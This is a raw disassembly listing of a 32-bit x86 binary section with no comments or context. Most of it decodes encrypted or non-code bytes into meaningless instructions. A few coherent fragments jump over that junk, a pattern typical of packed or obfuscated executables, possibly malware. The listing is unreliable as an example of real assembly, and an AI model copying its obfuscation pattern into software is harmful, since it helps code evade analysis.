  401914:	xchg   esp,eax
  401915:	pop    esi
  401916:	adc    ch,BYTE PTR [eax-0x5b]
  401919:	popf   
  40191a:	in     al,dx
  40191b:	aam    0x4a
  40191d:	pop    ebx
  40191e:	dec    edi
  40191f:	shr    al,0x12
  401922:	or     al,0x45
  401924:	scas   eax,DWORD PTR es:[edi]
  401925:	nop
  401926:	retf   
  401927:	jmp    0xe978aec8
  40192c:	pop    edx
  40192d:	pop    edi
  40192e:	outs   dx,DWORD PTR ds:[esi]
  40192f:	pop    ebx
  401930:	and    al,0xab
  401932:	repnz add BYTE PTR [eax],0x3d
  401936:	lea    eax,[edi]
  401938:	repz fsub st(3),st
  40193b:	shr    BYTE PTR [edi-0x2a],0x4c
  40193f:	mov    al,ds:0x2b0de568
  401944:	xchg   esi,eax
  401945:	outs   dx,DWORD PTR ds:[esi]
  401946:	retf   
  401947:	jl     0x40191f
  401949:	into   
  40194a:	aad    0xf2
  40194c:	inc    ebp
  40194d:	loop   0x401943
  40194f:	jmp    0x95cd:0x200e707d
  401956:	out    dx,eax
  401957:	lods   al,BYTE PTR ds:[esi]
  401958:	sbb    eax,0x149356be
  40195d:	leave  
  40195e:	push   ebp
  40195f:	out    dx,al
  401960:	mov    eax,ds:0x454675c7
  401965:	push   ebx
  401966:	(bad)  
  401967:	sbb    eax,0x4d822d30
  40196c:	pop    ecx
  40196d:	jmp    0xac20:0x831f4235
  401974:	mov    eax,0xf0092f24
  401979:	or     eax,0x63385caf
  40197e:	jo     0x401968
  401980:	ror    bh,1
  401982:	sub    BYTE PTR [edi],0xc5
  401985:	lods   eax,DWORD PTR ds:[esi]
  401986:	loopne 0x40197b
  401988:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401989:	cmp    al,ch
  40198b:	ret    
  40198c:	xchg   ebp,eax
  40198d:	in     al,dx
  40198e:	aad    0xbe
  401990:	pop    ebp
  401991:	test   eax,0xfec3844a
  401996:	in     eax,dx
  401997:	in     al,dx
  401998:	pop    ss
  401999:	sbb    al,0xe9
  40199b:	ins    BYTE PTR es:[edi],dx
  40199c:	jge    0x40197c
  40199e:	jle    0x40195e
  4019a0:	pop    edi
  4019a1:	dec    edi
  4019a2:	dec    ebx
  4019a3:	xchg   edi,eax
  4019a4:	das    
  4019a5:	sbb    al,0x6f
  4019a7:	imul   ebx,DWORD PTR [ebx+0xb],0xa00821ee
  4019ae:	push   eax
  4019af:	add    BYTE PTR [ecx],dh
  4019b1:	push   0x6affc84f
  4019b6:	jge    0x40196e
  4019b8:	sub    ebx,DWORD PTR [edx]
  4019ba:	enter  0xb40b,0xf7
  4019be:	push   edi
  4019bf:	xor    DWORD PTR [ebp+0x51],edi
  4019c2:	mov    eax,ds:0x79f3cfbf
  4019c7:	out    0x85,al
  4019c9:	out    0x6b,eax
  4019cb:	sub    ecx,DWORD PTR [edx+0x703439de]
  4019d1:	pop    ebx
  4019d2:	sub    al,0x39
  4019d4:	es loope 0x401a2b
  4019d7:	mov    ch,0x5d
  4019d9:	aaa    
  4019da:	inc    ebx
  4019db:	push   0x6c
  4019dd:	shl    bh,cl
  4019df:	jno    0x4019bc
  4019e1:	add    dl,al
  4019e3:	pushf  
  4019e4:	test   DWORD PTR [ebp+0xbb47f22],eax
  4019ea:	out    0x6e,al
  4019ec:	iret   
  4019ed:	shl    ch,cl
  4019ef:	mov    ah,0x36
  4019f1:	imul   ecx,DWORD PTR [ebp+0x71],0x856f5b6e
  4019f8:	mov    BYTE PTR [edi+0x734bede8],0x6a
  4019ff:	jns    0x4019f9
  401a01:	inc    ecx
  401a02:	dec    ecx
  401a03:	inc    esi
  401a04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a05:	int    0xe3
  401a07:	inc    ebx
  401a08:	cdq    
  401a09:	aas    
  401a0a:	bound  edx,QWORD PTR [ecx-0x67]
  401a0d:	sar    DWORD PTR [edi+ecx*1],cl
  401a10:	popf   
  401a11:	inc    esi
  401a12:	inc    edi
  401a13:	and    BYTE PTR [edx+0x39687085],dh
  401a19:	out    0xb9,al
  401a1b:	xchg   DWORD PTR [eax+ebp*1],edx
  401a1e:	cmp    eax,0x1b8b3664
  401a23:	rcl    BYTE PTR [ecx+0x5f],1
  401a26:	call   0x903e159f
  401a2b:	(bad)  
  401a2d:	shl    dh,cl
  401a2f:	dec    ecx
  401a30:	xchg   esp,eax
  401a31:	jmp    0xe188ec0e
  401a36:	sub    ch,bl
  401a38:	bound  ebx,QWORD PTR [esi+0x2e]
  401a3b:	xor    bl,BYTE PTR [eax-0x4d]
  401a3e:	xchg   edx,eax
  401a3f:	pop    ecx
  401a40:	cdq    
  401a41:	mov    DWORD PTR [ecx],ebx
  401a43:	adc    edx,DWORD PTR [eax+ebx*4+0x28a2f238]
  401a4a:	jbe    0x401a7a
  401a4c:	andps  xmm4,XMMWORD PTR [edx]
  401a4f:	xchg   esp,eax
  401a50:	inc    esi
  401a51:	mov    dl,0xda
  401a53:	sahf   
  401a54:	loop   0x4019f4
  401a56:	hlt    
  401a57:	sbb    bl,dh
  401a59:	jmp    0x401a6b
  401a5b:	xor    al,0xd
  401a5d:	jl     0x4019eb
  401a5f:	jge    0x401a37
  401a61:	pop    edi
  401a62:	mov    eax,DWORD PTR [ebp+0x8]
  401a65:	and    DWORD PTR ds:0x4346cf,0x0
  401a6f:	mov    ecx,DWORD PTR ds:0x4346cf
  401a75:	inc    ecx
  401a76:	mov    DWORD PTR ds:0x4346cf,ecx
  401a7c:	cmp    DWORD PTR ds:0x4346cf,0x5
  401a83:	jne    0x401a92
  401a89:	push   DWORD PTR [ebp-0x24]
  401a8c:	call   DWORD PTR ds:0x413274
  401a92:	cmp    DWORD PTR ds:0x4346cf,0x4
  401a99:	jne    0x401aae
  401a9f:	xor    ecx,ecx
  401aa1:	or     ecx,DWORD PTR ds:0x4346cf
  401aa7:	inc    ecx
  401aa8:	mov    DWORD PTR ds:0x4346cf,ecx
  401aae:	cmp    DWORD PTR ds:0x4346cf,0x11
  401ab5:	jb     0x401a6f
  401abb:	mov    ecx,DWORD PTR [ebp-0x10]
  401abe:	xor    eax,esi
  401ac0:	add    eax,edi
  401ac2:	mov    DWORD PTR [ecx],eax
  401ac4:	mov    eax,DWORD PTR [ebp-0x10]
  401ac7:	mov    ecx,DWORD PTR [ebp+0x10]
  401aca:	xor    ecx,esi
  401acc:	mov    edx,0xffcd8d67
  401ad1:	sub    edx,ecx
  401ad3:	add    DWORD PTR [eax],edx
  401ad5:	jmp    0x401ca9
  401ada:	icebp  
  401adb:	jmp    0x401a65
  401add:	imul   ebx,DWORD PTR [ebp+esi*2-0x17498c0f],0x3777485e
  401ae8:	cmp    DWORD PTR [eax+0x7e7e0452],esp
  401aee:	mov    ch,0x7f
  401af0:	jle    0x401b70
  401af2:	adc    ebp,DWORD PTR [eax+0x38]
  401af5:	mov    ah,0xa5
  401af7:	iret   
  401af8:	cmp    DWORD PTR [edx+0x3b],esi
  401afb:	les    ebp,FWORD PTR [ebp+ebp*1+0x50]
  401aff:	or     ch,bl
  401b01:	cdq    
  401b02:	outs   dx,BYTE PTR ds:[esi]
  401b03:	fucomi st,st(7)
  401b05:	fisttp WORD PTR [ebx-0x3f7d49c4]
  401b0b:	outs   dx,BYTE PTR ds:[esi]
  401b0c:	out    dx,al
  401b0d:	hlt    
  401b0e:	push   edx
  401b0f:	retf   0xc77c
  401b12:	jb     0x401b4d
  401b14:	pop    edi
  401b15:	push   0xffffffe1
  401b17:	cmp    edi,edi
  401b19:	arpl   WORD PTR [edx-0x3bea7c34],ax
  401b1f:	xor    esi,esi
  401b21:	jno    0x401b4b
  401b23:	sub    DWORD PTR [esi+0x41],esp
  401b26:	add    ebx,DWORD PTR [edi]
  401b28:	(bad)  ds:0x4a58cfa
  401b2e:	and    BYTE PTR [edi],bl
  401b30:	mov    ch,0x82
  401b32:	shl    DWORD PTR [ecx+0x6a],cl
  401b35:	add    esi,DWORD PTR [esp+ebx*4+0x4f2120a3]
  401b3c:	lock dec ebx
  401b3e:	scas   al,BYTE PTR es:[edi]
  401b3f:	inc    edx
  401b40:	or     eax,0x250c3de4
  401b45:	in     al,0x29
  401b47:	stc    
  401b48:	lea    ebx,[ebx-0x64]
  401b4b:	test   al,0x6e
  401b4d:	push   ss
  401b4e:	xchg   esp,eax
  401b4f:	mov    fs,esi
  401b51:	adc    eax,0x109ab5e7
  401b56:	repnz rcr BYTE PTR [edi+0x73],0xc8
  401b5b:	push   esi
  401b5c:	outs   dx,BYTE PTR ds:[esi]
  401b5d:	loopne 0x401b8f
  401b5f:	mov    ecx,0x12f2c263
  401b64:	fild   QWORD PTR [edx+0x49fb4b1]
  401b6a:	(bad)  
  401b6b:	inc    esi
  401b6d:	jae    0x401b68
  401b6f:	sbb    al,0xd3
  401b71:	mov    cl,0x34
  401b73:	jg     0x401af7
  401b75:	sub    eax,0x185fa659
  401b7a:	aaa    
  401b7b:	ins    DWORD PTR es:[edi],dx
  401b7c:	inc    edi
  401b7d:	mov    cs,WORD PTR [eax-0x4b]
  401b80:	fs pop ebp
  401b82:	into   
  401b83:	aam    0x4a
  401b85:	dec    eax
  401b86:	mov    eax,0x150411e0
  401b8b:	lea    edi,[eax-0x6a76c93e]
  401b91:	ret    
  401b92:	xchg   ebx,eax
  401b93:	mov    ebx,0x9a3eb257
  401b98:	cdq    
  401b99:	add    BYTE PTR ds:[edi-0x3eb221ae],0x70
  401ba1:	push   ebx
  401ba2:	int3   
  401ba3:	inc    esi
  401ba4:	sbb    al,0xbe
  401ba6:	or     DWORD PTR [ecx-0x39],esi
  401ba9:	push   esp
  401baa:	fs inc edi
  401bac:	aaa    
  401bad:	mov    al,ds:0x43c6bf34
  401bb2:	sub    eax,0x7e1c504b
  401bb7:	and    al,0x8e
  401bb9:	loop   0x401b4d
  401bbb:	ins    BYTE PTR es:[edi],dx
  401bbc:	push   0xab0825b1
  401bc1:	sbb    al,0xc1
  401bc3:	mov    dl,0x50
  401bc5:	popa   
  401bc6:	test   eax,0x5e2dd075
  401bcb:	loop   0x401c1f
  401bcd:	ret    
  401bce:	and    eax,0xee194c61
  401bd3:	repnz and DWORD PTR [eax+0x26e01a07],esi
  401bda:	adc    eax,0x77a8ba01
  401bdf:	retf   
  401be0:	add    DWORD PTR [edi+0x59889860],edi
  401be6:	imul   ebx,DWORD PTR [esi+0x2c],0xffffffe1
  401bea:	push   ebx
  401beb:	sub    al,0xdc
  401bed:	mov    WORD PTR [esi-0x21],fs
  401bf0:	sbb    BYTE PTR [ebx-0x133ac8ee],al
  401bf6:	mov    ebx,0xc468c0c8
  401bfb:	idiv   esi
  401bfd:	xchg   ecx,eax
  401bfe:	dec    esp
  401bff:	jno    0x401b92
  401c01:	xchg   ebp,eax
  401c02:	pop    edi
  401c03:	adc    edx,DWORD PTR [ebx-0x55e7c576]
  401c09:	mov    dh,0x73
  401c0b:	and    eax,0x90a04a
  401c10:	xchg   esp,eax
  401c11:	out    dx,al
  401c12:	out    0x51,al
  401c14:	(bad)  
  401c15:	jecxz  0x401c10
  401c17:	int3   
  401c18:	(bad)  
  401c1a:	jbe    0x401be0
  401c1c:	xlat   BYTE PTR ds:[ebx]
  401c1d:	sahf   
  401c1e:	pop    esi
  401c1f:	sub    BYTE PTR [esi+0x6a86062b],al
  401c25:	fidivr WORD PTR [eax-0x122fae8c]
  401c2b:	xchg   edx,eax
  401c2c:	mov    bh,0x72
  401c2e:	int    0x59
  401c30:	in     eax,0x8
  401c32:	push   edx
  401c33:	and    bl,BYTE PTR [ecx+edx*2]
  401c36:	inc    ebp
  401c37:	push   esp
  401c38:	cld    
  401c39:	inc    eax
  401c3a:	fst    st(1)
  401c3c:	je     0x401be6
  401c3e:	popf   
  401c3f:	out    0xb4,al
  401c41:	dec    ecx
  401c42:	inc    esp
  401c43:	sub    al,0x55
  401c45:	imul   esi,DWORD PTR [ecx-0x3e],0x73
  401c49:	ret    
  401c4a:	xchg   edi,eax
  401c4b:	mov    bl,0x3c
  401c4d:	or     BYTE PTR [edi-0x36],bh
  401c50:	jno    0x401c31
  401c52:	fmul   QWORD PTR [ebp-0x3a]
  401c55:	test   DWORD PTR [esi-0x65],edi
  401c58:	jbe    0x401c97
  401c5a:	pop    ebx
  401c5b:	mov    esp,0xdeef211a
  401c60:	inc    esi
  401c61:	sha1msg2 xmm2,XMMWORD PTR [ebx]
  401c65:	test   al,0x9a
  401c67:	sub    al,cl
  401c69:	ins    DWORD PTR es:[edi],dx
  401c6a:	sub    BYTE PTR ds:0xca0cedf9,al
  401c70:	inc    ebp
  401c71:	or     al,0x27
  401c73:	sub    al,0x6f
  401c75:	xor    BYTE PTR [eax],bl
  401c77:	xchg   DWORD PTR [ebx+0x73b31c7b],ebx
  401c7d:	mov    bl,0x6f
  401c7f:	fcomp  st(5)
  401c81:	pop    ebp
  401c82:	add    BYTE PTR [edi-0x1bfe5562],0xc1
  401c89:	test   al,0xcc
  401c8b:	xor    eax,0x635b73e7
  401c90:	sub    eax,0x9247b32
  401c95:	sub    ah,BYTE PTR [eax]
  401c97:	call   0xe6a3a6e8
  401c9c:	xchg   edi,eax
  401c9d:	jae    0x401c45
  401c9f:	loop   0x401c88
  401ca1:	outs   dx,BYTE PTR ds:[esi]
  401ca2:	aam    0x89
  401ca4:	fcom   DWORD PTR [ecx-0x5ea0bdb3]
  401caa:	ror    BYTE PTR [ebx+0x41],cl
  401cad:	add    BYTE PTR [ebx+0x4d8b6600],cl
  401cb3:	cld    
  401cb4:	movzx  ecx,cx
  401cb7:	add    ecx,DWORD PTR [eax]
  401cb9:	jmp    0x401e8d
  401cbe:	push   edi
  401cbf:	mov    DWORD PTR ds:0x7d73cde7,eax
  401cc5:	test   eax,0x7c3826d3
  401cca:	sti    
  401ccb:	dec    esp
  401ccc:	push   0xffffffa4
  401cce:	mov    DWORD PTR [esi],eax
  401cd0:	jle    0x401d50
  401cd2:	mov    ch,0x7f
  401cd4:	jle    0x401d54
  401cd6:	mov    ebx,0xedc4606d
  401cdb:	sahf   
  401cdc:	xor    eax,0xedd9e84a
  401ce1:	push   edx
  401ce2:	fdiv   DWORD PTR [ecx]
  401ce4:	jmp    0x2600:0xa522c19b
  401ceb:	aam    0x67
  401ced:	or     BYTE PTR [ecx+0x77],bh
  401cf0:	xchg   BYTE PTR [eiz*8+0x4fe81ec3],al
  401cf7:	ins    BYTE PTR es:[edi],dx
  401cf8:	mov    eax,ds:0x30d4274d
  401cfd:	inc    eax
  401cfe:	fwait
  401cff:	push   esi
  401d00:	cli    
  401d01:	push   0xffffffc4
  401d03:	popf   
  401d04:	jne    0x401d5b
  401d06:	cmp    al,0x7e
  401d08:	ins    BYTE PTR es:[edi],dx
  401d09:	or     eax,0x5f4e0e8e
  401d0e:	dec    ebp
  401d0f:	jno    0x401d28
  401d11:	mov    al,ds:0x6d1dc356
  401d16:	adc    al,0x72
  401d18:	sbb    BYTE PTR [eax],0x7a
  401d1b:	push   edi
  401d1c:	std    
  401d1d:	or     BYTE PTR [eiz*2-0x19f34fb5],bl
  401d24:	cwde   
  401d25:	cmp    dh,BYTE PTR [edi]
  401d27:	test   BYTE PTR [ebp-0x44377f85],0x12
  401d2e:	and    eax,0x5056fcb
  401d33:	bswap  esp
  401d35:	cwde   
  401d36:	or     ebp,ebx
  401d38:	ins    DWORD PTR es:[edi],dx
  401d39:	xor    dh,BYTE PTR [eax]
  401d3b:	jae    0x401d96
  401d3d:	jmp    0x401ccb
  401d3f:	mov    ecx,0xba0d3699
  401d44:	jg     0x401d35
  401d46:	cmp    al,cl
  401d48:	rol    al,cl
  401d4a:	mov    al,ds:0x1667ddb8
  401d4f:	les    ecx,FWORD PTR [ecx-0x486afea1]
  401d55:	call   0xb965cb0d
  401d5a:	or     dl,BYTE PTR [ebx-0x28]
  401d5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d5e:	stos   DWORD PTR es:[edi],eax
  401d5f:	cmp    bl,dl
  401d61:	pusha  
  401d62:	jnp    0x401d43
  401d64:	cmp    BYTE PTR [ebp-0x13d18b53],bl
  401d6a:	mov    bl,0x6b
  401d6c:	push   0x6e
  401d6e:	rcr    BYTE PTR [ecx],1
  401d70:	fcom   QWORD PTR [ebx+edi*8]
  401d73:	mov    ebp,0xe61ec356
  401d78:	sub    al,0xd
  401d7a:	mov    ebp,0x49e729d1
  401d7f:	les    edx,FWORD PTR [esi]
  401d81:	loope  0x401d6e
  401d83:	lock adc eax,0x84802b08
  401d89:	mov    bl,0x71
  401d8b:	nop
  401d8c:	mov    ds:0x4e343659,eax
  401d91:	stos   DWORD PTR es:[edi],eax
  401d92:	xchg   esi,eax
  401d93:	(bad)  
  401d94:	(bad)  
  401d95:	out    dx,al
  401d96:	sbb    BYTE PTR [esi+0x69d871ea],dl
  401d9c:	push   es
  401d9d:	pop    esp
  401d9e:	push   0xfffffff5
  401da0:	or     eax,0x6735847c
  401da5:	retf   0x4592
  401da8:	imul   ecx,DWORD PTR [ebx],0x65
  401dab:	loop   0x401e1b
  401dad:	jp     0x401dc5
  401daf:	xchg   edi,eax
  401db1:	sbb    ebx,DWORD PTR [esi]
  401db3:	sbb    ch,BYTE PTR [ebp+0x18]
  401db6:	adc    al,0xc
  401db8:	pop    eax
  401db9:	inc    ebx
  401dba:	rol    BYTE PTR [eax+0x489b8f16],cl
  401dc0:	test   eax,0xcb7f7828
  401dc5:	cmp    ecx,DWORD PTR [ebp+0x24]
  401dc8:	mov    al,0xe5
  401dca:	sbb    BYTE PTR [esi],al
  401dcc:	mov    esi,0xe87966fa
  401dd1:	or     al,0x5a
  401dd3:	call   0x51738e84
  401dd8:	inc    edx
  401dd9:	int    0x6e
  401ddb:	test   al,0x82
  401ddd:	adc    dh,BYTE PTR [eax]
  401ddf:	sub    esp,DWORD PTR [esi]
  401de1:	fldenv [ebp+eax*2-0x7b12c913]
  401de8:	inc    esp
  401de9:	dec    ebx
  401dea:	push   0xffffffb1
  401dec:	dec    esi
  401ded:	cmp    al,0xe2
  401def:	rol    BYTE PTR [ecx+ecx*4],cl
  401df2:	jo     0x401dc6
  401df4:	and    DWORD PTR [edi+0x1],edx
  401df7:	sar    bl,0xb8
  401dfa:	sbb    al,0xe2
  401dfc:	cmp    ah,bh
  401dfe:	(bad)  
  401dff:	aad    0xee
  401e01:	popf   
  401e02:	(bad)  
  401e03:	mov    edi,0xbd4063d8
  401e08:	add    DWORD PTR [edx-0x55],esi
  401e0b:	ficomp WORD PTR [ecx-0x607e7ccf]
  401e11:	xor    al,0x96
  401e13:	pop    ss
  401e14:	add    BYTE PTR [edx],0x33
  401e17:	ins    DWORD PTR es:[edi],dx
  401e18:	int    0x73
  401e1a:	ret    0x80e6
  401e1d:	mov    esp,0x3663f502
  401e22:	and    eax,0x40aa63af
  401e27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e28:	in     al,0x77
  401e2a:	mov    ch,0xd9
  401e2c:	push   esp
  401e2d:	mov    esi,0x79299bdf
  401e32:	jne    0x401ea7
  401e34:	daa    
  401e35:	cs cld 
  401e37:	mov    dh,0xf1
  401e39:	call   0xbef8:0xdb18ce0e
  401e40:	(bad)  
  401e42:	jmp    0xad6ef0eb
  401e47:	cs mov cl,0x86
  401e4a:	cmp    eax,0x46814d25
  401e4f:	(bad)  
  401e51:	xchg   BYTE PTR [esi+0x79],bh
  401e54:	add    BYTE PTR [esi+0x17],ch
  401e57:	xor    cl,BYTE PTR [eax+0x105c5ef1]
  401e5d:	cmp    BYTE PTR [eax],al
  401e5f:	jmp    0x7a6b5575
  401e64:	(bad)  
  401e65:	mov    esp,0xad726fe9
  401e6a:	inc    edi
  401e6b:	popa   
  401e6c:	ja     0x401e71
  401e6e:	nop
  401e6f:	sub    ebp,DWORD PTR [esi]
  401e71:	push   ss
  401e72:	sub    dl,BYTE PTR [ebx]
  401e74:	adc    BYTE PTR [edi-0x56f707f4],al
  401e7a:	icebp  
  401e7b:	mov    dl,0x18
  401e7d:	aam    0xc7
  401e7f:	aam    0x56
  401e81:	int3   
  401e82:	cmc    
  401e83:	dec    esi
  401e84:	adc    esi,DWORD PTR [ebx+0x70ba992b]
  401e8a:	aaa    
  401e8b:	inc    esp
  401e8c:	scas   al,BYTE PTR es:[edi]
  401e8d:	mov    DWORD PTR [ebp-0x18],ecx
  401e90:	mov    eax,DWORD PTR [ebp+0xc]
  401e93:	mov    ecx,DWORD PTR [ebp+0xc]
  401e96:	xor    eax,esi
  401e98:	add    eax,eax
  401e9a:	xor    ecx,esi
  401e9c:	sub    ecx,eax
  401e9e:	jmp    0x402072
  401ea3:	xchg   ecx,eax
  401ea4:	sahf   
  401ea5:	loopne 0x401e95
  401ea7:	icebp  
  401ea8:	jo     0x401e3b
  401eaa:	popa   
  401eab:	mov    eax,ds
  401ead:	cmp    DWORD PTR [edi],esi
  401eaf:	gs push edi
  401eb1:	lods   eax,DWORD PTR ds:[esi]
  401eb2:	or     eax,eax
  401eb4:	add    BYTE PTR [esi+0x7e],bh
  401eb7:	mov    ch,0x7f
  401eb9:	jle    0x401f39
  401ebb:	push   0x1a
  401ebd:	data16 das 
  401ebf:	out    dx,al
  401ec0:	(bad)  
  401ec2:	adc    al,0x5e
  401ec4:	and    al,BYTE PTR [ebp-0x5c]
  401ec7:	sbb    al,0x73
  401ec9:	or     ah,BYTE PTR [ecx]
  401ecb:	cwde   
  401ecc:	xchg   DWORD PTR [ebx-0x6ba0c858],ebx
  401ed2:	out    dx,al
  401ed3:	push   esi
  401ed4:	sub    eax,0x2b7d0033
  401ed9:	pop    edi
  401eda:	arpl   bp,sp
  401edc:	xor    ah,BYTE PTR [esi+ecx*2+0x315b2ed6]
  401ee3:	(bad)  
  401ee5:	ins    DWORD PTR es:[edi],dx
  401ee6:	pop    esi
  401ee7:	fsubr  QWORD PTR [edi+0x2e]
  401eea:	mov    bh,0x5b
  401eec:	popf   
  401eed:	mov    edi,0xcfabeb7f
  401ef2:	xor    DWORD PTR [ecx-0x51],ecx
  401ef5:	mov    bh,0x7f
  401ef7:	push   0x86ae3efa
  401efc:	jle    0x401e8e
  401efe:	xchg   ecx,eax
  401eff:	mov    ah,BYTE PTR [ebp+0x68edc2ba]
  401f05:	enter  0xdbe4,0x41
  401f09:	in     al,0xbb
  401f0b:	push   0x63
  401f0d:	inc    ebx
  401f0e:	xchg   edx,eax
  401f0f:	jmp    0x8cac4f33
  401f14:	mov    ds,WORD PTR [eax-0x33]
  401f17:	mov    eax,ds:0xe8e05660
  401f1c:	pop    eax
  401f1d:	pop    ss
  401f1e:	(bad)  
  401f1f:	mov    ecx,0x99da7b2
  401f24:	xchg   BYTE PTR [edx+0x63],dl
  401f27:	pop    es
  401f28:	inc    esi
  401f29:	outs   dx,BYTE PTR ds:[esi]
  401f2a:	repz dec eax
  401f2c:	sub    al,0x18
  401f2e:	sbb    eax,0xb917ad21
  401f33:	mov    WORD PTR [ecx],ds
  401f35:	fcom   QWORD PTR [ebx]
  401f37:	mov    ecx,edx
  401f39:	xlat   BYTE PTR ds:[ebx]
  401f3a:	adc    bl,BYTE PTR [esi-0x1b]
  401f3d:	mov    ebx,0x71c17749
  401f42:	sbb    bl,BYTE PTR [bp+si+0x64]
  401f46:	data16 cli 
  401f48:	loop   0x401f2e
  401f4a:	mov    ebx,0x37455ee2
  401f4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f50:	addr16 cmp edx,0xad3c5317
  401f57:	ror    BYTE PTR [ebx],cl
  401f59:	pop    ecx
  401f5a:	mov    bh,0xde
  401f5c:	arpl   di,sp
  401f5e:	shr    DWORD PTR fs:[ecx-0x7f],1
  401f62:	aad    0xe2
  401f64:	push   eax
  401f65:	cmp    bh,BYTE PTR [eax]
  401f67:	ret    
  401f68:	mov    al,ds:0xe929f228
  401f6d:	xor    DWORD PTR [ebx+eax*2-0x59],ecx
  401f71:	jbe    0x401f62
  401f73:	jmp    0x54dc:0x473203bc
  401f7a:	jge    0x401fb4
  401f7c:	or     al,0x8a
  401f7e:	mov    esp,0x5c6754ce
  401f83:	stos   DWORD PTR es:[edi],eax
  401f84:	ror    BYTE PTR [ebx+0x596e489a],cl
  401f8a:	sbb    al,0x8d
  401f8c:	dec    eax
  401f8d:	pop    ebx
  401f8e:	mov    cl,al
  401f90:	add    ecx,DWORD PTR [ecx+ebx*4]
  401f93:	mov    ecx,0xf605bd1f
  401f98:	mov    al,ds:0x9e67732
  401f9d:	jg     0x401fcb
  401f9f:	xor    al,0x76
  401fa1:	jg     0x401f7f
  401fa3:	mov    ds:0x415b3027,al
  401fa8:	ss lock mov esi,edi
  401fac:	div    BYTE PTR [ebp-0x4106640d]
  401fb2:	mov    ds:0xdd5c2188,eax
  401fb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401fb8:	pop    ds
  401fb9:	shl    DWORD PTR [esi],0x4e
  401fbc:	out    dx,al
  401fbd:	sbb    ebx,edi
  401fbf:	mov    ds:0x3ac8d640,eax
  401fc4:	inc    edi
  401fc5:	or     al,0x8d
  401fc7:	xor    ebx,DWORD PTR [ebx+ebp*8-0x30266999]
  401fce:	jno    0x402033
  401fd0:	sub    al,0x27
  401fd2:	sbb    BYTE PTR [ebx+0x75ddb40d],bh
  401fd8:	cmp    eax,0x8a82b5c3
  401fdd:	int3   
  401fde:	fwait
  401fdf:	ja     0x401ff3
  401fe1:	(bad)  
  401fe2:	sar    BYTE PTR [ebp-0x7e],1
  401fe5:	sbb    BYTE PTR [edi-0x441618b],dh
  401feb:	cmp    eax,0x8ad5aacd
  401ff0:	sti    
  401ff1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ff2:	out    dx,eax
  401ff3:	add    al,0x3b
  401ff5:	std    
  401ff6:	aas    
  401ff7:	popf   
  401ff8:	or     eax,0x3f17f654
  401ffd:	cmp    ch,BYTE PTR [ebx]
  401fff:	and    edi,esi
  402001:	sti    
  402002:	jo     0x401fc3
  402004:	dec    ebx
  402005:	mov    dl,0x16
  402007:	repz sub eax,0xa85f6b13
  40200d:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40200f:	inc    ebx
  402010:	in     eax,0xa4
  402012:	add    BYTE PTR [eax-0x34],bl
  402015:	ss std 
  402017:	xor    al,BYTE PTR [edx-0x3e]
  40201a:	sahf   
  40201b:	sar    BYTE PTR [edi],cl
  40201d:	adc    DWORD PTR [ebp-0x47ba27a],0x8
  402024:	pop    ebx
  402025:	dec    ebx
  402026:	mul    BYTE PTR [ecx+eiz*1+0x60647540]
  40202d:	jae    0x402086
  40202f:	test   al,0x30
  402031:	arpl   si,dx
  402033:	dec    edi
  402034:	aaa    
  402035:	rcr    DWORD PTR [eax+0x70],1
  402038:	repnz push eax
  40203a:	adc    eax,0x5fbbfef6
  40203f:	jbe    0x40207e
  402041:	and    al,0x5c
  402043:	sbb    dh,dl
  402045:	(bad)  
  402046:	retf   0x564e
  402049:	xchg   edx,eax
  40204a:	push   0xe9e84404
  40204f:	lahf   
  402050:	lds    eax,FWORD PTR [bx+di]
  402053:	mov    ebp,0xe7777790
  402058:	adc    al,0xbf
  40205a:	outs   dx,DWORD PTR ds:[esi]
  40205b:	sbb    cl,dl
  40205d:	mov    ds:0x9c292b26,eax
  402062:	arpl   WORD PTR [eax-0x2a03213d],dx
  402068:	repnz mov ds:0x60a21e65,eax
  40206e:	(bad)  
  402070:	sub    eax,0x458b6696
  402075:	cld    
  402076:	movzx  eax,ax
  402079:	sub    ecx,edi
  40207b:	cmp    eax,ecx
  40207d:	mov    eax,DWORD PTR [ebp+0x10]
  402080:	movzx  ecx,WORD PTR [ebp-0x4]
  402084:	jg     0x40226d
  40208a:	xor    eax,esi
  40208c:	sub    ecx,eax
  40208e:	sub    ecx,edi
  402090:	jmp    0x402264
  402095:	pop    es
  402096:	sbb    DWORD PTR [ecx+ebx*2],esi
  402099:	cmp    al,0x75
  40209b:	push   ebx
  40209c:	popa   
  40209d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40209e:	ins    DWORD PTR es:[edi],dx
  40209f:	std    
  4020a0:	and    DWORD PTR [edx+eiz*8+0x27fcaa9],edi
  4020a7:	jle    0x402127
  4020a9:	mov    ch,0x7f
  4020ab:	jle    0x40212b
  4020ad:	in     eax,dx
  4020ae:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020b0:	lds    edx,FWORD PTR [ecx]
  4020b2:	sbb    ebp,0xa17c5a80
  4020b8:	pop    ds
  4020b9:	sub    esi,edi
  4020bb:	push   ebx
  4020bc:	cmp    dh,BYTE PTR [edx+0x10e7871c]
  4020c2:	imul   esp,DWORD PTR [edx+eiz*1-0x3fdb2072],0x1344b002
  4020cd:	adc    al,0x26
  4020cf:	pop    ebx
  4020d0:	(bad)  
  4020d1:	sub    DWORD PTR [edx-0x3bcb434e],eax
  4020d7:	mov    bl,0xa8
  4020d9:	cmp    al,0xf
  4020db:	and    dh,dh
  4020dd:	xchg   esp,eax
  4020de:	push   esi
  4020df:	retf   
  4020e0:	addr16 out dx,eax
  4020e2:	js     0x402064
  4020e4:	inc    eax
  4020e5:	pop    es
  4020e6:	idiv   DWORD PTR [ebp+0x1e5229c9]
  4020ec:	(bad)  [ebp+0x2ca7151e]
  4020f2:	sti    
  4020f3:	sti    
  4020f4:	into   
  4020f5:	(bad)  
  4020f6:	cld    
  4020f7:	ret    
  4020f8:	cmp    bl,BYTE PTR [ecx+0x52f8ea1]
  4020fe:	(bad)  
  4020ff:	popa   
  402100:	fs push edi
  402102:	loopne 0x4020ee
  402104:	push   ecx
  402105:	lds    ecx,FWORD PTR [ebp+ebx*8-0x31]
  402109:	pop    ds
